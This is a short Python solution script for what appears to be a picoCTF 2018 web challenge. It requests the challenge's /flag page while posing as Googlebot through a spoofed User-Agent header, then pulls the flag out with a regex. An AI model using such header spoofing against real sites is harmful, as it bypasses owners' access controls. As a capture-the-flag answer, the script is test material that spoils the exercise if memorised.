#!/usr/bin/env python
import requests
import re

link = "http://2018shell.picoctf.com:53383/flag"
agent= "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

req = requests.get(link, headers={'User-Agent': agent})

print(re.search(r'picoCTF{.*}', req.text)[0])